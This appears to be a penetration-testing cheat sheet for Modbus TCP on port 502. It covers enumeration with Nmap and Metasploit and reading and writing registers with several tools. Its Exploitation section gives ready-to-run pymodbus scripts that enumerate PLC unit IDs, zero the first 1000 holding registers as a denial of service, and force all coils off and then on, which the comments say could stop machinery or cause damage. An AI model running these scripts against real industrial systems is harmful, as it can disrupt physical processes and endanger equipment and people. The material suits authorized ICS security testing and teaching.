# Port 502 - Modbus

## Table of Contents

- [Overview](#overview)
- [Enumeration](#enumeration)
- [Read/Write Registers](#readwrite-registers)
- [Exploitation](#exploitation)

---

## Overview

| Port | Protocol | Description |
| :--- | :--- | :--- |
| 502 | Modbus TCP | Industrial protocol |
| 503 | Modbus TCP/TLS | Secure Modbus |

> ⚠️ Modbus has **NO authentication** by default - very dangerous!

### Function Codes

| Code | Function | Description |
| :--- | :--- | :--- |
| 0x01 | Read Coils | Read discrete outputs (1-bit) |
| 0x02 | Read Discrete Inputs | Read discrete inputs (1-bit) |
| 0x03 | Read Holding Registers | Read analog outputs (16-bit) |
| 0x04 | Read Input Registers | Read analog inputs (16-bit) |
| 0x05 | Write Single Coil | Write single discrete output |
| 0x06 | Write Single Register | Write single analog output |
| 0x0F | Write Multiple Coils | Write multiple outputs |
| 0x10 | Write Multiple Registers | Write multiple registers |

---

## Enumeration

### Nmap

```shell
nmap -sV -p 502 $rhost
nmap -p 502 --script modbus-discover $rhost
nmap -p 502 --script modbus-discover --script-args modbus-discover.aggressive=true $rhost
```

### Metasploit

```shell
# Modbus client
use auxiliary/scanner/scada/modbusclient
set RHOSTS $rhost
set UNIT_NUMBER 1
set DATA_ADDRESS 0
set NUMBER 10
run

# Modbus device ID
use auxiliary/scanner/scada/modbusdetect
set RHOSTS $rhost
run
```

---

## Read/Write Registers

### Using modbus-cli

```shell
# Install
gem install modbus-cli

# Read holding registers (function 0x03)
modbus read $rhost %MW0 10

# Read coils (function 0x01)
modbus read $rhost %M0 10

# Write register (function 0x06)
modbus write $rhost %MW0 1234

# Write coil (function 0x05)
modbus write $rhost %M0 1
```

### Using pymodbus

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

target_host = "TARGET_IP"  # Replace with target

client = ModbusTcpClient(target_host, port=502)
client.connect()

# Read holding registers (address 0, count 10)
result = client.read_holding_registers(0, 10, unit=1)
print(f"Holding Registers: {result.registers}")

# Read coils (address 0, count 10)
result = client.read_coils(0, 10, unit=1)
print(f"Coils: {result.bits}")

# Write single register
client.write_register(0, 1337, unit=1)

# Write single coil (ON)
client.write_coil(0, True, unit=1)

client.close()
```

### Using mbtget

```shell
# Install mbtget
apt install mbtget

# Read holding registers
mbtget -r3 -a 0 -n 10 $rhost

# Read coils
mbtget -r1 -a 0 -n 10 $rhost

# Write register
mbtget -w6 -a 0 1234 $rhost
```

---

## Exploitation

### Enumerate All Units/Slaves

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

target_host = "TARGET_IP"  # Replace with target

client = ModbusTcpClient(target_host, port=502)
client.connect()

for unit_id in range(1, 248):
    try:
        result = client.read_holding_registers(0, 1, unit=unit_id)
        if not result.isError():
            print(f"[+] Unit ID {unit_id} responds: {result.registers}")
    except:
        pass

client.close()
```

### DoS Attack (for testing)

```python
#!/usr/bin/env python3
# ⚠️ Only for authorized testing!
from pymodbus.client import ModbusTcpClient

target_host = "TARGET_IP"  # Replace with target

client = ModbusTcpClient(target_host, port=502)
client.connect()

# Write zeros to all registers (DANGEROUS!)
for addr in range(0, 1000):
    client.write_register(addr, 0, unit=1)
    print(f"Zeroed register {addr}")

client.close()
```

### Change PLC State

```python
#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

target_host = "TARGET_IP"  # Replace with target

client = ModbusTcpClient(target_host, port=502)
client.connect()

# Turn all coils OFF (could stop machinery!)
for addr in range(0, 100):
    client.write_coil(addr, False, unit=1)

# Or turn all ON (could cause damage!)
for addr in range(0, 100):
    client.write_coil(addr, True, unit=1)

client.close()
```

---

## Quick Reference

| Tool | Command | Description |
| :--- | :--- | :--- |
| Nmap | `nmap -p 502 --script modbus-discover $rhost` | Discover Modbus |
| mbtget | `mbtget -r3 -a 0 -n 10 $rhost` | Read registers |
| modbus-cli | `modbus read $rhost %MW0 10` | Read holding registers |
| Metasploit | `use auxiliary/scanner/scada/modbusclient` | Modbus client |
